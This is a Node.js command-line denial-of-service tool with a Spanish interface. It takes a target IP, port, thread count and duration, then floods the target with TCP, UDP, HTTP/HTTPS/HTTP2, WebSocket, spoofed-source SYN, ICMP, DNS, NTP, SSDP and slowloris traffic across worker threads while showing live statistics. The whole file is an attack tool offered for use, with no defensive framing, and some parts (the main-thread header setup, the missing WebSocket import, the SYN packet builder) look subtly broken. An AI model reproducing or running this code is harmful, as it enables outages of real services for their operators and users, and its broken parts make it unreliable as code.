#!/usr/bin/env node
'use strict';

const net = require('net');
const dgram = require('dgram');
const http = require('http');
const https = require('https');
const http2 = require('http2');
const tls = require('tls');
const { Worker, isMainThread, parentPort, workerData } = require('worker_threads');
const { performance } = require('perf_hooks');
const readline = require('readline');
const chalk = require('chalk');
const { randomBytes, randomFillSync } = require('crypto');
const raw = require('raw-socket');

const MAX_THREADS = 4096;
const MAX_DURATION = 1800;
const PACKET_TYPES = {
    TCP: 'tcp',
    UDP: 'udp',
    HTTP: 'http',
    HTTPS: 'https',
    HTTP2: 'http2',
    WS: 'websocket',
    SYN: 'syn',
    ICMP: 'icmp',
    DNS: 'dns',
    NTP: 'ntp',
    SSDP: 'ssdp',
    SLOWLORIS: 'slowloris'
};

class UltimateDDoS {
    constructor() {
        this.config = {
            payloads: {
                tcp: this.generatePayload(1024),
                udp: this.generatePayload(65507),
                http: this.generateHttpHeaders(),
                dns: this.generateDnsQuery(),
                ntp: this.generateNtpPacket(),
                ssdp: this.generateSsdpRequest()
            },
            methods: Object.values(PACKET_TYPES),
            timeout: 1500,
            workerPool: []
        };

        this.stats = {
            total: 0,
            success: 0,
            failed: 0,
            bandwidth: 0,
            startTime: 0
        };

        this.running = false;
        this.animationFrames = ['⣾', '⣽', '⣻', '⢿', '⡿', '⣟', '⣯', '⣷'];
    }

    generatePayload(size) {
        const buf = Buffer.alloc(size);
        randomFillSync(buf);
        return buf;
    }

    generateHttpHeaders() {
        return [
            'GET /' + randomBytes(8).toString('hex') + ' HTTP/1.1',
            'Host: ' + workerData.target,
            'User-Agent: ' + this.randomUserAgent(),
            'Accept: */*',
            'Connection: keep-alive',
            'X-Forwarded-For: ' + this.randomIp(),
            '\r\n'
        ].join('\r\n');
    }

    randomUserAgent() {
        const agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
            'Mozilla/5.0 (X11; Linux x86_64; rv:109.0)',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X)',
            'Googlebot/2.1 (+http://www.google.com/bot.html)'
        ];
        return agents[Math.floor(Math.random() * agents.length)];
    }

    randomIp() {
        return Array.from({length: 4}, () => Math.floor(Math.random() * 255)).join('.');
    }

    generateDnsQuery() {
        const domain = randomBytes(8).toString('hex') + '.com';
        return Buffer.from([
            0xAA, 0xAA, 0x01, 0x00, 0x00, 0x01, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, domain.length, ...Buffer.from(domain),
            0x00, 0x00, 0x01, 0x00, 0x01
        ]);
    }

    generateNtpPacket() {
        const packet = Buffer.alloc(48);
        packet[0] = 0x1B;
        return packet;
    }

    generateSsdpRequest() {
        return Buffer.from(
            'M-SEARCH * HTTP/1.1\r\n' +
            'HOST: 239.255.255.250:1900\r\n' +
            'MAN: "ssdp:discover"\r\n' +
            'MX: 1\r\n' +
            'ST: ssdp:all\r\n' +
            '\r\n'
        );
    }

    startAttack(target, port, threads, duration, methods) {
        if (this.running) return;
        
        this.running = true;
        this.stats.startTime = performance.now();

        if (isMainThread) {
            console.log(chalk.green(`\n[+] Iniciando ataque a ${target}:${port}`));
            this.startWorkers(target, port, threads, duration, methods);
            this.showStats();
            setTimeout(() => this.stop(), duration * 1000);
        } else {
            this.executeFlood(workerData.target, workerData.port, workerData.threads, workerData.methods);
        }
    }

    startWorkers(target, port, threads, duration, methods) {
        const cpuCores = require('os').cpus().length;
        const threadsPerWorker = Math.ceil(threads / cpuCores);

        for (let i = 0; i < cpuCores; i++) {
            const worker = new Worker(__filename, {
                workerData: { target, port, threads: threadsPerWorker, methods }
            });

            worker.on('message', (msg) => {
                this.stats.total += msg.total;
                this.stats.success += msg.success;
                this.stats.failed += msg.failed;
                this.stats.bandwidth += msg.bandwidth;
            });

            this.config.workerPool.push(worker);
        }
    }

    executeFlood(target, port, threads, methods) {
        methods.forEach(method => {
            for (let i = 0; i < threads; i++) {
                this[method + 'Flood'](target, port);
            }
        });
    }

    tcpFlood(target, port) {
        const socket = new net.Socket();
        socket.connect(port, target, () => {
            socket.write(this.config.payloads.tcp);
            this.reportStats('success', this.config.payloads.tcp.length);
            socket.destroy();
        }).on('error', () => this.reportStats('failed', 0));
    }

    udpFlood(target, port) {
        const socket = dgram.createSocket('udp4');
        socket.send(this.config.payloads.udp, port, target, (err) => {
            err ? this.reportStats('failed', 0) 
                : this.reportStats('success', this.config.payloads.udp.length);
            socket.close();
        });
    }

    httpFlood(target, port) {
        const req = http.request(`http://${target}:${port}`, {
            method: 'GET',
            headers: this.config.payloads.http
        }, (res) => {
            res.on('data', (d) => this.reportStats('success', d.length));
            res.on('end', () => this.reportStats('success', 0));
        }).on('error', () => this.reportStats('failed', 0));
        req.end();
    }

    httpsFlood(target, port) {
        const req = https.request(`https://${target}:${port}`, {
            method: 'POST',
            headers: { 'Content-Length': this.config.payloads.tcp.length },
            rejectUnauthorized: false
        }, (res) => {
            res.on('data', (d) => this.reportStats('success', d.length));
        }).on('error', () => this.reportStats('failed', 0));
        req.end(this.config.payloads.tcp);
    }

    http2Flood(target, port) {
        const client = http2.connect(`https://${target}:${port}`, { rejectUnauthorized: false });
        const req = client.request({ ':path': `/?${randomBytes(8).toString('hex')}` });
        req.on('data', (d) => this.reportStats('success', d.length));
        req.on('end', () => this.reportStats('success', 0));
        req.end();
    }

    websocketFlood(target, port) {
        const ws = new WebSocket(`ws://${target}:${port}`);
        ws.on('open', () => {
            ws.send(this.config.payloads.tcp);
            this.reportStats('success', this.config.payloads.tcp.length);
            ws.close();
        }).on('error', () => this.reportStats('failed', 0));
    }

    synFlood(target, port) {
        const socket = raw.createSocket({ protocol: raw.Protocol.TCP });
        const packet = this.buildSynPacket(target, port);
        raw.writeSocket(socket, packet, 0, packet.length, target, (err) => {
            err ? this.reportStats('failed', 0) : this.reportStats('success', packet.length);
        });
    }

    icmpFlood(target) {
        const socket = raw.createSocket({ protocol: raw.Protocol.ICMP });
        const packet = this.buildIcmpPacket();
        raw.writeSocket(socket, packet, 0, packet.length, target, (err) => {
            err ? this.reportStats('failed', 0) : this.reportStats('success', packet.length);
        });
    }

    dnsFlood(target, port) {
        const socket = dgram.createSocket('udp4');
        socket.send(this.config.payloads.dns, port, target, (err) => {
            err ? this.reportStats('failed', 0) 
                : this.reportStats('success', this.config.payloads.dns.length);
            socket.close();
        });
    }

    ntpFlood(target, port) {
        const socket = dgram.createSocket('udp4');
        socket.send(this.config.payloads.ntp, port, target, (err) => {
            err ? this.reportStats('failed', 0) 
                : this.reportStats('success', this.config.payloads.ntp.length);
            socket.close();
        });
    }

    ssdpFlood(target, port) {
        const socket = dgram.createSocket('udp4');
        socket.send(this.config.payloads.ssdp, port, target, (err) => {
            err ? this.reportStats('failed', 0) 
                : this.reportStats('success', this.config.payloads.ssdp.length);
            socket.close();
        });
    }

    slowlorisFlood(target, port) {
        const socket = net.connect(port, target);
        socket.write(`GET / HTTP/1.1\r\nHost: ${target}\r\n`);
        setInterval(() => {
            socket.write(`X-${randomBytes(4).toString('hex')}: ${Math.random()}\r\n`);
        }, 15000);
        socket.on('error', () => this.reportStats('failed', 0));
    }

    buildSynPacket(target, port) {
        return Buffer.from([
            0x45, 0x00, 0x00, 0x3c, 0x00, 0x00, 0x40, 0x00,
            0x40, 0x06, 0x00, 0x00, ...this.randomIpBuffer(),
            ...this.parseIp(target), (port >> 8), (port & 0xff),
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x50, 0x02, 0x20, 0x00, 0x00, 0x00, 0x00, 0x00
        ]);
    }

    buildIcmpPacket() {
        const packet = Buffer.alloc(64);
        packet.writeUInt8(8, 0);
        packet.writeUInt8(0, 1);
        packet.writeUInt16BE(1, 2);
        return packet;
    }

    randomIpBuffer() {
        return Array.from({length: 4}, () => Math.floor(Math.random() * 255));
    }

    parseIp(ip) {
        return ip.split('.').map(Number);
    }

    reportStats(type, bytes) {
        if (!this.running) return;
        
        const stats = {
            total: 1,
            success: type === 'success' ? 1 : 0,
            failed: type === 'failed' ? 1 : 0,
            bandwidth: bytes
        };

        if (isMainThread) {
            Object.entries(stats).forEach(([key, value]) => this.stats[key] += value);
        } else {
            parentPort.postMessage(stats);
        }
    }

    showStats() {
        if (!this.running) return;
        
        const elapsed = (performance.now() - this.stats.startTime) / 1000;
        const anim = this.animationFrames[Math.floor(elapsed * 10) % this.animationFrames.length];
        const rps = (this.stats.total / elapsed).toFixed(0);
        const bw = (this.stats.bandwidth / 1024 / 1024 / 1024).toFixed(3);

        process.stdout.write(chalk`\r{green ${anim}} ` +
            chalk`{white Tiempo:} {greenBright ${elapsed.toFixed(1)}s} ` +
            chalk`{white Solicitudes:} {cyan ${this.stats.total}} ` +
            chalk`{white SPS:} {cyan ${rps}} ` +
            chalk`{white BW:} {cyan ${bw}GB} ` +
            chalk`({green ${this.stats.success}}|{red ${this.stats.failed}})`
        );

        setTimeout(() => this.showStats(), 100);
    }

    stop() {
        if (!this.running) return;
        
        this.running = false;
        this.config.workerPool.forEach(w => w.terminate());
        console.log(chalk`\n\n{yellow [!] Ataque finalizado}`);
        process.exit();
    }
}

// Interfaz de línea de comandos
if (isMainThread) {
    const rl = readline.createInterface({
        input: process.stdin,
        output: process.stdout
    });

    const attack = new UltimateDDoS();
    
    rl.question(chalk.greenBright('IP objetivo: '), ip => {
        rl.question(chalk.greenBright('Puerto objetivo: '), port => {
            rl.question(chalk.greenBright(`Hilos (1-${MAX_THREADS}): `), threads => {
                rl.question(chalk.greenBright(`Duración (1-${MAX_DURATION}s): `), duration => {
                    rl.question(chalk.greenBright('Métodos (separados por coma): '), methods => {
                        const selectedMethods = methods.split(',').filter(m => PACKET_TYPES[m.trim().toUpperCase()]);
                        attack.startAttack(
                            ip,
                            parseInt(port),
                            Math.min(parseInt(threads), MAX_THREADS),
                            Math.min(parseInt(duration), MAX_DURATION),
                            selectedMethods.length ? selectedMethods : Object.values(PACKET_TYPES)
                        );
                    });
                });
            });
        });
    });
}